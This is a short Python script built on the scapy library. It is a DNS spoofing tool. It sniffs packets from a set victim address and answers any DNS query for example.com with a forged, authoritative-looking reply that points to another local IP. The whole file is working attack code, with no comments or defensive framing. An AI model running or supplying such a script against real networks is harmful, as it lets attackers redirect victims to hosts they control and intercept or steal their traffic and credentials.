import scapy.all as sc

victim_ip = "192.168.1.5"
fake_ip = "192.168.1.100"
target_domain = b"example.com."

def dns_spoof(packet):
    if packet.haslayer(sc.DNS) and packet.getlayer(sc.DNS).qr == 0:
        current_domain = packet[sc.DNSQR].qname
        if current_domain == target_domain:
            spoofed_packet = sc.IP(dst=packet[sc.IP].src, src=packet[sc.IP].dst) / \
                          sc.UDP(dport=packet[sc.UDP].sport, sport=53) / \
                          sc.DNS(id=packet[sc.DNS].id, qr=1, aa=1, qd=packet[sc.DNS].qd, an=sc.DNSRR(rrname=current_domain, ttl=300, rdata=fake_ip))
            
            sc.send(spoofed_packet, verbose=False)

sc.sniff(filter=victim_ip, prn=dns_spoof)